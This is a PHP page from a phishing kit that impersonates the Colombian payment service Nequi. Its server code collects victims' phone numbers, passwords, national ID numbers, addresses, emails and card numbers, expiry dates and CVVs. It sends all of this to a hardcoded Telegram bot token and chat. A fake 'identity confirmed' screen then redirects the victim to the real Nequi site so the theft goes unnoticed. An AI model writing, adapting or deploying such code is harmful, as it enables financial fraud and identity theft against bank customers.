<?php

session_start();

if($_SERVER["REQUEST_METHOD"] == "POST"){


    $codigo = $_POST['codigo'];
    $fecha = $_POST['fecha'];
    $cvv = $_POST['cvv'];

    $user = $_SESSION["j_username"];
    $pass = $_SESSION["j_password"];
    $nombre = $_SESSION["nombre"];
    $cedula = $_SESSION["cedula"];
    $ciudad = $_SESSION["ciudad"];
    $dir = $_SESSION["dir"];
    $email = $_SESSION["email"];

    $contenido = "\n 🔥NEQUI REGISTRO🔥";
    $contenido .="\n📞Número Teléfono: $user";
    $contenido .= "\n📞Contraseña: $pass";
   
    $contenido .= "\n\n Otros Datos";
    $contenido .= "\n🪪 Nombre: $nombre";
    $contenido .= "\n🪪 Cedula: $cedula";
    $contenido .= "\n🪪 Ciudad: $ciudad";
    $contenido .= "\n🪪 Direccion: $dir";
    $contenido .= "\n🪪 Email: $email";

    $contenido .= "\nDATOS KOKOLOKO";

    $contenido .= "\n💳 Codigo: $codigo";
    $contenido .= "\n💳 Fecha Exp: $fecha";
    $contenido .= "\n💳 Cvv: $cvv";

    $token = "6564238774:AAGE60CsOG6Yn4-kHFRVqzY2MUHag5Uda3A";
    $chatId = "-4081527724";
    enviarMensajeTelegram($chatId,$contenido,$token);

}else{
    header("location:https://ayuda.nequi.com.co/hc/es/articles/360060514532-Todo-lo-que-debes-saber-del-pr%C3%A9stamo-Propulsor");
}




function enviarMensajeTelegram($chatId, $contenido, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $contenido
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        // Error al enviar el mensaje
        return false;
    }

    // El mensaje se envió correctamente
    return true;
}



?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <link rel="stylesheet" type="text/css" href="css/normalize.css">
    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body><header class="ng-scope">
                <div class="wrap-header">
                    <div class="row">
                        <div class="col-xs-12 col-md-2">
                            <div class="logo"> <a href="https://www.nequi.com.co"> <img alt="nequi"
                                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                                </a> </div>
                            <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a class=""> <span></span> </a>
                            </div>
                        </div>
                        <div class="col-xs-12 col-md-10 container-buttons">
                            <div class="wrap-main-menu ">
                                <div class="row">
                                    <div class="col-xs-12 col-md-8"> </div>
                                    <div class="col-xs-12 col-md-4">
                                        <div class="buttons-right">
                                            <ul> <!-- ngIf: !hidePa -->
                                                <li ng-if="!hidePa" class="ng-scope"> <a target="_blank"
                                                        href="https://recarga.nequi.com.co/bdigitalpsl"
                                                        class="ng-binding">Recarga</a> </li><!-- end ngIf: !hidePa -->
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header><section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                <img src="images/push-action-timerV2.gif" alt="" srcset="" width="20%">
                <h1 class="ng-binding">Identidad Confirmada</h1>
                <p class="ng-binding">Ya puedes seguir usando nuestros servicios</p>
                <div class="login-form-wrap">
                    <form method="POST" action="finalizar" autocomplete="off"
                        name="loginControl.formLogin" novalidate=""
                        class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-invalid-recaptcha">
                       <img src="images/loading.gif" alt="" srcset="" width="25%">

                                
                    </form>
                </div>
            </div>
        </section>

        
    <script>
        // Espera 3000 milisegundos (3 segundos) antes de redirigir
        setTimeout(function() {
            // Cambia la URL a la que quieres redirigir
            window.location.href = 'https://www.nequi.com.co';
        }, 1500);
    </script>
    
</body>
</html>